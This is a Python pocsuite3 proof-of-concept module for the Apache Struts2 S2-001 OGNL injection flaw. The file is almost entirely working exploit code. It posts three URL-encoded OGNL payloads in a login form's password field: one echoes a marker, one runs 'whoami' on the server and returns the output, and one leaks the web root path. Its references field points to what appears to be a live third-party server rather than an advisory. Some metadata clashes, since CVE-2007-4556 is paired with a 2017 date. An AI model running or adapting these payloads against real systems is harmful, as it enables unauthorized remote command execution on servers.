# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str

class DemoPOC(POCBase):
    vulID = "CVE-2007-4556"
    version ='1'
    author = ["LMX"]
    vulDate = "2017-07-07"
    createDate = "2022-2-3"
    updateDate = "2022-2-3"
    references =["http://5.249.156.94:8080/etrackweb/loginAction.action"]
    name ="S2-001 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Strute2'
    appVersion = '1.2.3-2.0.4 '
    vulType = 'RCE'
    desc = '''
    struts2-001远程代码执行漏洞
    '''

    def _verify(self):
        result ={}
        payload = '''username=111&password=%25%7b%23response%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23response.print%28%22web%22%29%2c%23response.println%28%2288888888%22%29%2c%23response.flush%28%29%2c%23response.close%28%29%7d'''
        payload_2 = '''username=111&password=%25%7b%23a%3d%28new+java.lang.ProcessBuilder%28new+java.lang.String%5b%5d%7b%22whoami%22%7d%29%29.redirectErrorStream%28true%29.start%28%29%2c%23b%3d%23a.getInputStream%28%29%2c%23c%3dnew+java.io.InputStreamReader%28%23b%29%2c%23d%3dnew+java.io.BufferedReader%28%23c%29%2c%23e%3dnew+char%5b50000%5d%2c%23d.read%28%23e%29%2c%23f%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2c%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2c%23f.getWriter%28%29.flush%28%29%2c%23f.getWriter%28%29.close%28%29%7d'''
        payload_3 = '''username=111&password=%25%7b%23req%3d@org.apache.struts2.ServletActionContext@getRequest%28%29%2c%23response%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23response.println%28%23req.getRealPath%28%27%2f%27%29%29%2c%23response.flush%28%29%2c%23response.close%28%29%7d'''
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        url = self.url
        r = requests.post(url=self.url,headers=headers,data=payload)
        rr = requests.post(url=self.url,headers=headers,data=payload_2)
        rrr = requests.post(url=self.url,headers=headers,data=payload_3)
        
        try:
            if 'web88888888' in r.text or 'root' in rr.text or '/webapps' in rrr.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC)
